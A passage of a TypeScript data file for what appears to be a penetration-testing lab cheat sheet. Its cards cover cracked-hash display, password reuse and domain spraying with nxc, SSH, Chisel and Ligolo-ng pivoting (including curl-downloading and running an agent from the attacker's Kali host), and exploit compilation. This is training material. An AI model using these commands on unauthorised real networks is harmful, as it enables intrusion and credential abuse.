hashcat -m 1000 ntlm.txt --show`,
    alive: `Status...........: Cracked
user:password`,
    dead: "Separator unmatched or Token length exception: wrong -m or extra fields in the line. Exhausted: not in the wordlist.",
    next: "Or open Builders and pick hashcat. Show, copy the password, spray it. A GPU session you cannot watch is not progress.",
  },
  {
    id: "pw-landed",
    section: "Passwords",
    title: "A password just appeared",
    look: "A config, a file, a crack, or a page just gave you a secret. Write it down before the next command. Then try it in this order. A spray is the last step, not the first.",
    cmd: `# write it. user, password, where it came from, which host
# 1. the same service that revealed it. one login
# 2. the other open ports on THAT host
nxc smb <ip> -u <user> -p '<pass>'
nxc winrm <ip> -u <user> -p '<pass>'
ssh <user>@<ip>
# web form and the database, by hand, once
# 3. if the name looks like a domain user, the DC only
nxc smb <dc> -u <user> -p '<pass>'
# 4. only if the DC said [+], one spray of this password
#    the spray card. not rockyou`,
    alive: "[+] or a shell on a host you could already see, and the password is in your notes.",
    dead: "You sprayed the subnet before you tried it on the box it came from. Or you closed the note and the password was only on the screen.",
    next: "A hit is a new landing. No hit for that user: the reuse card, then the spray card.",
  },
  {
    id: "pw-reuse",
    section: "Passwords",
    title: "Password reuse",
    look: "One password you already hold. Every other account on this box, once, including root. This is not a wordlist and it is not a domain spray.",
    cmd: `# Linux, on the box. Accounts that have a shell.
awk -F: '$7 ~ /sh$/ {print $1}' /etc/passwd
# each name, this password, once. Then root, once.
su - <user>
su - root
# from Kali. users.txt is that short list. One password.
nxc ssh <ip> -u users.txt -p '<pass>' --continue-on-success
nxc smb <ip> -u users.txt -p '<pass>' --local-auth --continue-on-success
nxc winrm <ip> -u users.txt -p '<pass>' --local-auth --continue-on-success`,
    alive: "su prints a new uid, or nxc prints [+] for an account you were not already using.",
    dead: "Authentication failure on every name, including root. The password is not reused on this host.",
    next: "A new user means the Linux or Windows list again, as them. The domain spray is the next card, and only after --pass-pol.",
  },
  {
    id: "pw-spray",
    section: "Passwords",
    title: "Spray, do not brute",
    look: "One or two passwords you already found, against users you already enumerated. Lockout is how you fail an AD set.",
    cmd: `# read the lockout before you spray
nxc smb <dc> -u <user> -p '<pass>' --pass-pol
nxc smb <targets> -u users.txt -p '<one-password>' --continue-on-success
# BadPwdCount close to LockoutThreshold: stop
# one password, then wait. not rockyou`,
    alive: "[+] domain\\user:password and a (Pwn3d!) you did not already have.",
    dead: "A wall of STATUS_LOGON_FAILURE. The password is not reused. Stop.",
    next: "The new [+] is a new host. Landing checks again.",
  },
  {
    id: "pv-when",
    section: "Tunneling",
    title: "When to pivot",
    look: "Run this on the pivot, the machine you already have a shell on. You are looking for a second interface, a route Kali does not have, or a port bound to 127.0.0.1 on that host. If ip a shows only the network you already scanned, you do not need Chisel or Ligolo.",
    cmd: `# Linux
ip a; ip route
ss -tlnp
# Windows
ipconfig /all
route print
netstat -ano | findstr LISTENING`,
    alive: `eth1 172.16.x.x
or
127.0.0.1:8080 LISTENING`,
    dead: "One NIC in the same subnet as Kali, and every listener is 0.0.0.0 on a port you already scanned.",
    next: "Ligolo when you want to scan a whole new subnet. Chisel for one port or a quick SOCKS. SSH when you already have SSH.",
  },
  {
    id: "pv-ssh",
    section: "Tunneling",
    title: "SSH tunnels",
    look: "You already have an SSH login on the pivot, so use it before you upload Ligolo or Chisel. -L is typed on Kali: it opens a port on Kali and the pivot connects onward. -D is a SOCKS proxy that also listens on Kali. -R is the other direction, for a callback, and it is the next card.",
    cmd: `# leave the session up. -N means no shell.
# one internal web port
ssh -N -L 8080:127.0.0.1:80 <user>@<pivot>
# a port on a second host the pivot can see
ssh -N -L 8445:<internal>:445 <user>@<pivot>
# SOCKS. proxychains, and nmap must be -sT
ssh -N -D 1080 <user>@<pivot>
proxychains -q nmap -Pn -sT -p 22,80,445 <internal>
# USE IT
# browser on 127.0.0.1:8080 is their site
# nxc against 127.0.0.1 -p 8445 is their SMB, when you forwarded 445`,
    alive: "Your Kali browser on 127.0.0.1:8080 shows the internal site, or proxychains returns open ports.",
    dead: "channel setup failed or the remote port is closed. The tunnel is up but there is nothing behind it.",
    next: "Enumerate what you can now reach. Do not leave three tunnels open.",
  },
  {
    id: "pv-chisel",
    section: "Tunneling",
    title: "Chisel",
    look: "A shell on the pivot, no SSH, and the pivot can reach your Kali IP. The server and the file download both listen on Kali. The client runs on the pivot. SOCKS is for a few hosts and needs proxychains on Kali. One R: line is a single port the pivot can see, shown on a localhost port on Kali. A service bound to 127.0.0.1 on the victim is R:local:127.0.0.1:port, not SOCKS. A whole /24 is Ligolo.",
    cmd: `# Kali first
chisel server -p 8000 --reverse
file chisel
# Linux target. Release binary, not the source page.
curl -o /tmp/chisel http://<KALI>/chisel && chmod +x /tmp/chisel
/tmp/chisel client <KALI>:8000 R:socks
# one port: Kali 8081 -> the target's view of an internal web port
/tmp/chisel client <KALI>:8000 R:8081:<internal>:80
# victim loopback. 127.0.0.1 here is the victim. On Kali you then use 127.0.0.1:8081
/tmp/chisel client <KALI>:8000 R:8081:127.0.0.1:3306
# Kali. /etc/proxychains4.conf ends with: socks5 127.0.0.1 1080
proxychains -q nmap -Pn -sT -p 22,80,445,3389,5985 <internal>
curl -sI http://127.0.0.1:8081/
# USE IT
# the new ports go through the normal service cards
# Windows client is the next Chisel card`,
    alive: "server log: session#1 started, and the forwarded port answers.",
    dead: "connection refused on 8000 (server not listening), or the client binary is the wrong OS. Timeout means the target cannot route to your VPN IP.",
    next: "Scan through the proxy with -sT, not SYN. SYN scans lie through SOCKS.",
  },
  {
    id: "pv-ligolo",
    section: "Tunneling",
    title: "Ligolo-ng",
    look: "Use this when you need a subnet, not one port. The proxy listens on Kali before the agent runs on the pivot. After start, you add a route on Kali, and nmap, nxc, and curl run with no proxychains. The victim's 127.0.0.1 is 240.0.0.1 on that interface. Do not route 127.0.0.0/8. A host that cannot see Kali calls back to the pivot, which is the callback card.",
    cmd: `# Kali, once per boot. 'file exists' means skip the add.
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# target, release agent, after file says ELF or PE
./agent -connect <KALI>:11601 -ignore-cert
# typed in the proxy window
session
start
# the subnet you saw on the target's ip a / ipconfig
sudo ip route add 172.16.0.0/24 dev ligolo
# if this proxy build has it, autoroute does the same add
# USE IT. Normal tools. No proxychains.
nmap -Pn -sC -sV -p 22,80,445,3389,5985 172.16.0.10
nxc smb 172.16.0.0/24 -u <user> -p '<pass>'
# tear down when the subnet is finished
sudo ip route del 172.16.0.0/24
# victim loopback, after start. 240.0.0.1 means their 127.0.0.1. Never route 127.0.0.0/8.
sudo ip route add 240.0.0.1/32 dev ligolo
nmap -Pn -sT -p <port> 240.0.0.1`,
    alive: "Agent joined, start says tun created, and ping or nmap to 172.16.x.x works.",
    dead: "Agent never joins: wrong IP, firewall, or you started the route before start. 'file exists' on tuntap means the interface is already there. Do not add it twice.",
    next: "Treat the new subnet as a new recon. Full methodology again, starting at Nmap.",
  },
  {
    id: "cc-gcc",
    section: "Compile",
    title: "gcc",
    look: "You only compile when a stock binary will not do. Match the target. A Kali-built dynamic binary often will not run on Ubuntu 20.04.",
    cmd: `gcc file.c -o out
file out
ldd out
# if the target is older
gcc -static file.c -o out
ldd out`,
    alive: `ELF 64-bit LSB executable, statically linked
ldd: not a dynamic executable`,
    dead: `/lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34 not found
# or
invalid preprocessing directive #Exploit
# or
missing terminating " character`,
    next: "GLIBC errors: rebuild with -static. The #Exploit lines are Exploit-DB headers, not C. Delete them or turn them into // comments. A broken string means a quote was split across two lines. Put it back on one line.",
  },
  {
    id: "cc-win",
    section: "Compile",
    title: "Windows cross compile",
    look: "System Type from systeminfo. x64-based PC gets the x64 toolchain. Do not upload a 32-bit exe and call the Potato broken.",
    cmd: `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
i686-w64-mingw32-gcc exploit.c -o exploit32.exe
file exploit.exe`,
    alive: "PE32+ executable (console) x86-64, size in the same range as a known-good build.",
    dead: "PE32 (80386) on a 64-bit-only tool, or the target says cannot execute. Check file on Kali before you transfer.",
    next: "Transfer, compare size, run once.",
  },
  {
    id: "cc-skip",
    section: "Compile",
    title: "When not to compile",
    look: "If a release binary already exists (PrintSpoofer, GodPotato, chisel, ligolo agent), use the release. Compiling a broken PoC is the slow path.",
    cmd: `file tool.exe
ls -l tool.exe
# GitHub: download the release asset, not the source page`,
    alive: "file says PE or ELF and the size matches the release (not 441 bytes).",
    dead: "ASCII text or HTML saved as .exe. head shows <html or Not Found.",
    next: "Fix the download. Do not debug a file that is not a program.",
  },
];

export const TECHNIQUES: Technique[] = [...BRIEFS, ...CORE, ...MORE_TECHNIQUES, ...PRIVESC_TECHNIQUES, ...COVER, ...SERVICES_MORE, ...COMMANDS, ...API_TECHNIQUES];
